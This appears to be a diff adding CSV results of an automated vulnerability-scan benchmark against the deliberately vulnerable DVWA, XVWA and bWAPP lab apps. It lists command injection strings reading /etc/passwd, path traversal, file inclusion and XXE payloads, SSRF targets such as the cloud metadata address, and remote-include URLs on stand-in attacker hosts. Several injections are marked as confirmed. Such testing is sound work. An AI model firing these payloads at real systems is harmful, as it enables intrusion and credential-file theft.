+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Basic,7,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,219,,2026-10-19T02:43:15.553543+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Basic,8,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,219,,2026-10-19T02:43:15.568570+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Advanced,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:15.597457+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Advanced,2,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:15.605618+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Advanced,3,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,110,,2026-10-19T02:43:15.622313+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Advanced,4,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:15.644826+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Advanced,5,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,109,,2026-10-19T02:43:15.654508+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Advanced,6,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,110,,2026-10-19T02:43:15.663581+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Advanced,7,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:15.668368+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Advanced,8,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:15.676738+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Basic,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,516,,2026-10-19T02:43:16.123741+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Basic,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,78,,2026-10-19T02:43:15.700624+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Basic,3,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:43:15.705132+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Basic,4,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,62,,2026-10-19T02:43:15.711210+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Basic,5,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,250,,2026-10-19T02:43:15.916956+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Basic,6,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,296,,2026-10-19T02:43:15.971088+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Basic,7,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,297,,2026-10-19T02:43:15.973855+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Basic,8,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,297,,2026-10-19T02:43:15.991651+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Advanced,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,297,,2026-10-19T02:43:15.993371+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Advanced,2,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,282,,2026-10-19T02:43:15.995001+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Advanced,3,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,219,,2026-10-19T02:43:16.003839+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Advanced,4,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:16.030185+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Advanced,5,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,31,,2026-10-19T02:43:16.160548+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Advanced,6,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:16.205265+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Advanced,7,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:16.188322+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Command Injection,Advanced,8,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,125,,2026-10-19T02:43:16.261791+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Basic,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,516,,2026-10-19T02:43:16.646690+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Basic,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,63,,2026-10-19T02:43:16.193299+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Basic,3,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:16.227007+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Basic,4,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,109,,2026-10-19T02:43:16.256785+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Basic,5,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,125,,2026-10-19T02:43:16.272502+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Basic,6,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:16.278917+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Basic,7,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:16.285780+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Basic,8,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:16.301159+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Advanced,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:16.339612+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Advanced,2,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:16.344465+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Advanced,3,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,94,,2026-10-19T02:43:16.348902+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Advanced,4,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:16.364888+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Advanced,5,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,172,,2026-10-19T02:43:16.449056+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Advanced,6,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,156,,2026-10-19T02:43:16.453945+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Advanced,7,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,156,,2026-10-19T02:43:16.467554+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,Command Injection,Advanced,8,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,157,,2026-10-19T02:43:16.491126+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Basic,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,469,,2026-10-19T02:43:16.814101+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Basic,2,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,141,,2026-10-19T02:43:16.499245+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Basic,3,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,140,,2026-10-19T02:43:16.517943+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Basic,4,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:16.540676+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Basic,5,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:16.548481+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Basic,6,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:16.554751+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Basic,7,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:16.562756+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Basic,8,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:16.566591+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Advanced,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:16.570594+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Advanced,2,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,125,,2026-10-19T02:43:16.662000+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Advanced,3,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,171,,2026-10-19T02:43:16.711171+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Advanced,4,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,156,,2026-10-19T02:43:16.716512+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Advanced,5,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,172,,2026-10-19T02:43:16.727240+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Advanced,6,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,156,,2026-10-19T02:43:16.732233+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Advanced,7,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,156,,2026-10-19T02:43:16.736492+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Advanced,8,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:16.741434+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Evasion,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:16.751603+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Evasion,2,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:16.754721+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Evasion,3,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:16.755736+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Evasion,4,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:43:16.755736+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Evasion,5,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:16.852018+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Evasion,6,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:16.870631+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Evasion,7,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:16.873472+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Path Traversal,Evasion,8,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:16.877705+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Basic,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:43:17.167053+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Basic,2,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:43:16.920319+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Basic,3,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,110,,2026-10-19T02:43:16.942757+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Basic,4,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,110,,2026-10-19T02:43:16.952291+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Basic,5,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:16.959402+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Basic,6,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:43:16.966450+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Basic,7,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:16.973411+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Basic,8,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,390,,2026-10-19T02:43:17.265571+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Advanced,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:17.027611+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Advanced,2,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.037029+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Advanced,3,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.044202+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Advanced,4,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.053195+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Advanced,5,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.062928+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Advanced,6,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.074349+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Advanced,7,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:17.089041+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Advanced,8,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,46,,2026-10-19T02:43:17.094115+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Evasion,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:17.099132+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Evasion,2,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:17.105523+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Evasion,3,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:17.131268+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Evasion,4,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:17.135556+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Evasion,5,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:17.139607+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Evasion,6,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:17.143608+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Evasion,7,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:17.148610+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Path Traversal,Evasion,8,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:17.156702+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Basic,1,http://[::1],0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Basic,2,http://169.254.169.254,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Basic,3,http://0.0.0.0,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Basic,4,http://127.0.0.1,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Basic,5,http://localhost,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Advanced,1,http://localhost,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Advanced,2,http://127.0.0.1,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Advanced,3,http://0.0.0.0,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Advanced,4,http://169.254.169.254,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Advanced,5,http://[::1],0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Evasion,1,http://localhost,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Evasion,2,http://169.254.169.254,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Evasion,3,http://[::1],0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Evasion,4,http://0.0.0.0,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SSRF,Evasion,5,http://127.0.0.1,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Basic,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,250,,2026-10-19T02:43:17.393040+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Basic,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:43:17.203472+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Basic,3,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:17.218062+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Basic,4,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.224715+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Advanced,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:17.234410+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Advanced,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.249888+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Advanced,3,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:43:17.254610+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Advanced,4,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:17.274671+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Evasion,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:43:17.274671+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Evasion,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:17.274671+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Evasion,3,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:17.306541+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Local File Inclusion,Evasion,4,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:17.307138+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Basic,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,266,,2026-10-19T02:43:17.653723+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Basic,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:17.449454+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Basic,3,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:17.459151+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Basic,4,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:17.465165+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Advanced,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:17.471084+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Advanced,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:43:17.514685+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Advanced,3,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:43:17.519441+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Advanced,4,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:17.529056+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Evasion,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.537458+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Evasion,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:43:17.541661+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Evasion,3,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.555918+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Local File Inclusion,Evasion,4,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:43:17.564894+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Basic,1,http://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Basic,2,http://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Basic,3,http://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Advanced,1,http://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Advanced,2,http://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Advanced,3,http://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Evasion,1,http://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Evasion,2,http://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Remote File Inclusion,Evasion,3,http://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:43:13.125262+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Basic,1,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,485,,2026-10-19T02:43:18.001269+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Basic,2,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,78,,2026-10-19T02:43:17.584685+00:00
